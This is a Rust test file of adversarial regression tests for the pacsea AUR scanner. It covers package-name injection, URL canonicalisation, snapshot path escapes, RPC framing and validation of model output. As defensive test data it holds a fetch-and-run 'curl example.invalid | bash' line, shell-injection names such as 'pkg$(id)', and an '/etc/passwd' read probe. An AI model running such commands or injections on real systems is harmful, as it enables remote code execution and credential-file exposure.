//! Executable adversarial regression contracts for the Pi-backed AUR scanner boundary.

use pacsea::logic::pi_scan::result::{
    EvidenceIndex, ExpectedIdentity, ResultError, validate_response,
};
use pacsea::pi_agent::{process, protocol, restricted_tools};

/// What: Require strict package-base validation before any AUR URL or Git argv construction.
///
/// Inputs:
/// - Leading-dash, traversal, slash, NUL/control, whitespace, and shell-metacharacter cases.
///
/// Output:
/// - WS1 must reject every adversarial package base deterministically.
///
/// Details:
/// - Remains ignored until the identity module owns the public validator.
#[test]
fn wave0_red_package_base_injection_is_rejected() {
    use pacsea::logic::pi_scan::identity::PackageBase;

    assert!(PackageBase::new("pacsea-bin").is_ok());
    for hostile in [
        "-leading",
        "../escape",
        "nested/name",
        "nul\0byte",
        "line\nbreak",
        "white space",
        "pkg;touch-owned",
        "pkg$(id)",
    ] {
        assert!(PackageBase::new(hostile).is_err(), "accepted {hostile:?}");
    }
}

/// What: Require canonical official-AUR recipe identity and immutable full commit OIDs.
///
/// Inputs:
/// - Userinfo, query, fragment, alternate port, non-AUR host, abbreviated/malformed OIDs.
///
/// Output:
/// - WS1 accepts only canonical official AUR URL plus full immutable identity.
///
/// Details:
/// - Covers manual mapping and observed-head acquisition contracts.
#[test]
fn wave0_red_aur_commit_identity_is_canonical() {
    use pacsea::logic::pi_scan::identity::{AurRepoUrl, CommitOid};

    let (url, base) = AurRepoUrl::parse_canonical("https://aur.archlinux.org/pacsea-bin.git")
        .expect("canonical official AUR URL");
    assert_eq!(url.as_str(), "https://aur.archlinux.org/pacsea-bin.git");
    assert_eq!(base.as_str(), "pacsea-bin");
    assert_eq!(
        CommitOid::new("A".repeat(40)).expect("full OID").as_str(),
        "a".repeat(40)
    );
    for hostile in [
        "https://user@aur.archlinux.org/pacsea-bin.git",
        "https://aur.archlinux.org:443/pacsea-bin.git",
        "https://evil.example/pacsea-bin.git",
        "https://aur.archlinux.org/pacsea-bin.git?ref=main",
        "https://aur.archlinux.org/pacsea-bin.git#main",
    ] {
        assert!(AurRepoUrl::parse_canonical(hostile).is_err());
    }
    for oid in [
        "a".repeat(39),
        "a".repeat(41),
        format!("{}z", "a".repeat(39)),
    ] {
        assert!(CommitOid::new(oid).is_err());
    }
}

/// What: Require corrupt/newer baseline state to quarantine and fail closed.
///
/// Inputs:
/// - Invalid JSON and unsupported schema fixtures.
///
/// Output:
/// - Dedicated loader never returns an empty accepted baseline.
///
/// Details:
/// - The existing generic cache loader is intentionally not an acceptable implementation.
#[test]
fn wave0_red_malformed_baseline_never_becomes_empty_state() {
    use pacsea::logic::pi_scan::baseline::{
        AcceptedBaselineState, PersistenceError, load_versioned_state,
    };

    let temp = tempfile::tempdir().expect("temp dir");
    let state = temp.path().join("baseline-v1.json");
    let quarantine = temp.path().join("quarantine");
    std::fs::write(&state, b"{not-json").expect("corrupt fixture");
    let error = load_versioned_state::<AcceptedBaselineState>(&state, 1, &quarantine, "baseline")
        .expect_err("corrupt state must fail");
    assert!(matches!(error, PersistenceError::Corrupt { .. }));
    assert!(
        !state.exists(),
        "corrupt original must be moved, not retained"
    );
    assert_eq!(
        std::fs::read_dir(&quarantine).expect("quarantine").count(),
        1
    );

    std::fs::write(&state, br#"{"schema_version":999,"entries":{}}"#).expect("newer fixture");
    let error = load_versioned_state::<AcceptedBaselineState>(&state, 1, &quarantine, "baseline")
        .expect_err("newer state must fail");
    assert!(matches!(
        error,
        PersistenceError::UnsupportedNewerVersion { observed: 999, .. }
    ));
    assert!(!state.exists(), "newer original must be moved, not reset");
    assert_eq!(
        std::fs::read_dir(&quarantine).expect("quarantine").count(),
        2
    );
}

/// What: Require path resolution to reject traversal, absolute paths, and symlink escapes.
///
/// Inputs:
/// - Parent components, absolute paths, link escapes, root replacement, and special files.
///
/// Output:
/// - WS2 restricted tools return bounded inert errors without reading host data.
///
/// Details:
/// - The test will later use a sentinel outside the snapshot root.
#[test]
fn wave0_red_restricted_paths_cannot_escape_snapshot() {
    use restricted_tools::{SnapshotRegistry, ToolError, read_file};

    let temp = tempfile::tempdir().expect("temp dir");
    let root = temp.path().join("snapshot");
    let outside = temp.path().join("outside");
    std::fs::create_dir_all(&root).expect("snapshot");
    std::fs::create_dir_all(&outside).expect("outside");
    std::fs::write(outside.join("secret"), "sentinel").expect("sentinel");
    #[cfg(unix)]
    std::os::unix::fs::symlink(outside.join("secret"), root.join("escape")).expect("escape link");
    let mut registry = SnapshotRegistry::new();
    registry.register("recipe", &root).expect("registry");

    for hostile in ["../outside/secret", "/etc/passwd", "C:/Windows/System32"] {
        assert!(read_file(&registry, "recipe", hostile, 0, None).is_err());
    }
    #[cfg(unix)]
    assert_eq!(
        read_file(&registry, "recipe", "escape", 0, None),
        Err(ToolError::OutsideRoot)
    );
}

/// What: Require the model-visible read tool to be unable to read an outside-root sentinel.
///
/// Inputs:
/// - Private snapshot descriptor and a host sentinel adjacent to the snapshot.
///
/// Output:
/// - No sentinel bytes appear in tool output, errors, logs, or persisted state.
///
/// Details:
/// - Complements pure path normalization with an end-to-end fake-Pi boundary test.
#[test]
fn wave0_red_pi_cannot_read_outside_root_sentinel() {
    use restricted_tools::{SnapshotRegistry, find_paths, grep_literal, read_file};

    const SENTINEL: &str = "PACSEA-OUTSIDE-ROOT-SENTINEL";
    let temp = tempfile::tempdir().expect("temp dir");
    let root = temp.path().join("snapshot");
    std::fs::create_dir_all(&root).expect("snapshot");
    std::fs::write(temp.path().join("host-secret"), SENTINEL).expect("sentinel");
    let mut registry = SnapshotRegistry::new();
    registry.register("source", &root).expect("registry");

    let error = read_file(&registry, "source", "../host-secret", 0, None)
        .expect_err("outside read must fail")
        .to_string();
    let grep = grep_literal(&registry, "source", SENTINEL, true, None).expect("grep");
    let find = find_paths(&registry, "source", "**/*secret*", None).expect("find");
    assert!(!error.contains(SENTINEL));
    assert!(grep.matches.is_empty());
    assert!(find.entries.is_empty());
}

/// What: Require strict bounded LF-only RPC framing.
///
/// Inputs:
/// - CR-only, invalid UTF-8/JSON, Unicode separators, oversized and incomplete records.
///
/// Output:
/// - WS2 accepts LF records, strips one trailing CR, and rejects every malformed case.
///
/// Details:
/// - Generic Unicode line readers are forbidden by the Pi RPC contract.
#[test]
fn wave0_red_rpc_framing_is_lf_only_and_bounded() {
    use protocol::{LineFramer, ProtocolError, decode_record};

    let mut framer = LineFramer::new(8);
    let oversized = framer
        .push(b"123456789\n{}\n")
        .expect_err("oversized complete record must fail");
    assert_eq!(
        oversized,
        ProtocolError::RecordTooLarge {
            observed: 9,
            limit: 8
        }
    );
    assert!(framer.next_record().is_none());

    let mut valid = LineFramer::new(64);
    valid.push(b"{\"ok\":true}\r\n").expect("bounded");
    let record = valid.next_record().expect("record");
    assert!(decode_record(&record).is_ok());
    assert_eq!(
        decode_record(b"{\"a\":1}\r{\"b\":2}"),
        Err(ProtocolError::EmbeddedCarriageReturn)
    );
}

/// What: Require strict model-response and evidence validation against hostile output.
///
/// Inputs:
/// - Duplicate keys, trailing objects, fabricated evidence, controls, oversized values, and tool payloads.
///
/// Output:
/// - WS2 rejects the entire attempt without persisting or presenting unvalidated content.
///
/// Details:
/// - The executable assertion must bind findings to exact identity and manifest evidence.
#[test]
fn wave0_red_model_output_and_evidence_are_strictly_validated() {
    let identity = ExpectedIdentity {
        scan_id: "scan-1".to_string(),
        package_base: "demo".to_string(),
        commit_oid: "a".repeat(40),
    };
    let mut evidence = EvidenceIndex::new();
    evidence.insert("recipe", "PKGBUILD", "curl example.invalid | bash");
    let valid = format!(
        "{{\"schema_version\":\"pacsea-scan-schema-1\",\"scan_id\":\"scan-1\",\
         \"package_base\":\"demo\",\"commit_oid\":\"{}\",\"coverage\":\"complete\",\
         \"limitations\":[],\"findings\":[{{\"severity\":\"high\",\"title\":\"remote execution\",\
         \"snapshot\":\"recipe\",\"path\":\"PKGBUILD\",\"evidence\":\"curl example.invalid | bash\",\
         \"rationale\":\"executes a download\",\"recommendation\":\"review before use\"}}]}}",
        "a".repeat(40)
    );
    assert!(validate_response(&valid, &identity, &evidence).is_ok());
    assert!(matches!(
        validate_response(&format!("{valid}{valid}"), &identity, &evidence),
        Err(ResultError::Framing(_))
    ));
    let fabricated = valid.replace("curl example.invalid | bash", "invented evidence");
    assert!(matches!(
        validate_response(&fabricated, &identity, &evidence),
        Err(ResultError::FabricatedEvidence { .. })
    ));
    let duplicated = valid.replacen(
        "\"coverage\":\"complete\"",
        "\"coverage\":\"complete\",\"coverage\":\"incomplete\"",
        1,
    );
    assert!(matches!(
        validate_response(&duplicated, &identity, &evidence),
        Err(ResultError::Framing(
            protocol::ProtocolError::DuplicateKey { .. }
        ))
    ));
}

/// What: Require the embedded restricted-tool extension hash to be verified before Pi launch.
///
/// Inputs:
/// - Untampered, modified, truncated, and replacement extension assets.
///
/// Output:
/// - WS2 launches only the compiled trusted asset and fails closed on every mismatch.
///
/// Details:
/// - The executable assertion must observe that a mismatch prevents process creation.
#[test]
fn wave0_red_extension_asset_hash_is_verified_before_launch() {
    let temp = tempfile::tempdir().expect("temp dir");
    let runtime = process::create_private_runtime_dir(temp.path(), "runtime").expect("runtime");
    let extension = process::materialize_extension(&runtime).expect("extension");
    assert_eq!(
        process::verify_extension_asset(&extension).expect("verified"),
        process::EMBEDDED_EXTENSION_SHA256
    );
    std::fs::write(&extension, "export default function tampered() {}\n").expect("tamper");
    let spec = process::PiLaunchSpec {
        executable: "/nonexistent/pacsea-pi-must-not-run".into(),
        neutral_cwd: temp.path().to_path_buf(),
        extension_path: extension,
    };
    assert!(matches!(
        process::launch_pi(&spec).expect_err("hash mismatch must preclude spawn"),
        process::ProcessError::ExtensionHashMismatch { .. }
    ));
}

/// What: Require cancellation to abort, group-kill, reap, and suppress correction/fallback.
///
/// Inputs:
/// - Fake child that forks, ignores TERM, and emits unbounded output.
///
/// Output:
/// - No zombie/orphan survives the five-second grace and ten-second shutdown deadline.
///
/// Details:
/// - Uses the approved process-group mechanism once WS2 owns it.
#[test]
#[cfg(unix)]
fn wave0_red_cancellation_reaps_entire_pi_process_group() {
    use std::os::unix::process::CommandExt as _;
    use std::process::{Command, Stdio};
    use std::time::Duration;

    let shell = which::which("sh").expect("POSIX shell required by cancellation fixture");
    let child = Command::new(shell)
        .arg("-c")
        .arg("trap '' TERM; (trap '' TERM; while :; do sleep 1; done) & while :; do sleep 1; done")
        .stdin(Stdio::null())
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .process_group(0)
        .spawn()
        .expect("fixture child");
    let mut process = process::PiProcess {
        child,
        extension_sha256: process::embedded_extension_sha256(),
        tool_contract_version: pacsea::pi_agent::TOOL_CONTRACT_VERSION,
    };
    let mut rpc = Vec::new();
    let mut correlator = protocol::CommandCorrelator::new();
    correlator.issue("prompt").expect("pending prompt");
    let outcome = process
        .abort_and_terminate(
            &mut rpc,
            &mut correlator,
            Duration::from_millis(250),
            Duration::from_secs(5),
        )
        .expect("abort/kill/reap");
    assert_eq!(outcome, process::TerminationOutcome::Killed);
    assert_eq!(correlator.pending_len(), 0);
    assert!(process.child.try_wait().expect("reaped").is_some());
    let rpc = String::from_utf8(rpc).expect("RPC UTF-8");
    assert!(rpc.contains("\"type\":\"abort_retry\""));
    assert!(rpc.contains("\"type\":\"abort\""));
}

/// What: Require dry-run acquisition to leave durable scanner state unchanged and never launch Pi.
///
/// Inputs:
/// - Read-only AUR/source/key acquisition in an isolated config root.
///
/// Output:
/// - Preview evidence exists, all temporary data is removed, and no durable scan state changes.
///
/// Details:
/// - Reflects the post-interview dry-run contract rather than the superseded no-network draft.
#[test]
fn wave0_red_dry_run_acquires_without_pi_or_durable_mutation() {
    use pacsea::logic::pi_scan::source::{
        AcquisitionStatus, ArchiveFormat, ArchiveLimits, inspect_source,
    };

    let temp = tempfile::tempdir().expect("temp dir");
    let durable = temp.path().join("backlog-v1.json");
    std::fs::write(&durable, b"durable-sentinel").expect("sentinel");
    let report = inspect_source(
        "payload.sh",
        b"echo deterministic-preview\n",
        ArchiveFormat::Raw,
        ArchiveLimits::default(),
    );
    assert_eq!(report.status, AcquisitionStatus::Complete);
    assert_eq!(report.manifest.entries.len(), 1);
    assert_eq!(
        std::fs::read(&durable).expect("unchanged sentinel"),
        b"durable-sentinel"
    );
    assert!(
        !temp
            .path()
            .join(process::EMBEDDED_EXTENSION_FILE_NAME)
            .exists(),
        "pure acquisition must not materialize or launch the Pi extension"
    );
}

/// What: Require identity changes to invalidate results and acknowledgements.
///
/// Inputs:
/// - AUR HEAD or mutable source ref changed after the frozen scan identity.
///
/// Output:
/// - Result becomes stale and linked continuation requires separate acknowledgement/rescan.
///
/// Details:
/// - Late responses may never overwrite a newer target or baseline.
#[test]
fn wave0_red_stale_head_invalidates_result_and_acknowledgement() {
    use pacsea::logic::pi_scan::result::{Coverage, MergedScanResult};
    use pacsea::state::{PiScanDisplayResult, PiScanWorkspaceState};

    let identity = ExpectedIdentity {
        scan_id: "scan-stale".to_string(),
        package_base: "demo".to_string(),
        commit_oid: "a".repeat(40),
    };
    let current = PiScanDisplayResult {
        observed_head_oid: "1".repeat(40),
        validated: MergedScanResult {
            identity,
            coverage: Coverage::Complete,
            limitations: Vec::new(),
            findings: Vec::new(),
        },
        stale: false,
        mutable_sources: Vec::new(),
    };
    let current_binding = current.binding();
    let mut workspace = PiScanWorkspaceState::default();
    workspace.results.push(current);
    workspace
        .stale_acknowledgements
        .insert(current_binding.clone());
    workspace.results[0].stale = true;
    let stale_binding = workspace.results[0].binding();
    assert_ne!(current_binding, stale_binding);
    assert!(!workspace.stale_acknowledgements.contains(&stale_binding));
    assert!(!workspace.selected_result_acknowledged());
    workspace.acknowledge_selected_stale();
    assert!(workspace.selected_result_acknowledged());
}
